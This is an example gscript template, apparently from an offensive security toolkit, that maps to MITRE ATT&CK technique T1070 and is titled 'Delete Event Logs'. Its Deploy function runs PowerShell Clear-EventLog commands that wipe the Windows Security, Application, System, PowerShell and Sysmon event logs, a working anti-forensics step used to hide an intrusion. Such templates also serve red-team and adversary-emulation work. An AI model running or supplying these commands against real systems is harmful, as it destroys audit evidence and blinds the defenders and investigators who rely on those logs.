// Example gscript template
// Title: Delete Event Logs
// Author: ahhh
// Purpose: Deletes a number of critical security event logs on a Windows machine
// Gscript version: 0.1.2
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1070

//priority:150
//timeout:150

function BeforeDeploy() {
  LogInfo("starting execution of Delete Event Logs");
  return true; 
}

function Deploy() {  
  ExecuteCommand("powershell.exe", ["Clear-EventLog", "Security, Application, System"]);
  ExecuteCommand("powershell.exe", ["Clear-EventLog", "Windows, PowerShell"]);
  ExecuteCommand("powershell.exe", ["Clear-EventLog", "Sysmon"]);
  LogInfo("Cleared Event Logs");
  return true;
}

function AfterDeploy() {
  LogInfo("done Delete Event Logs");
  return true;
}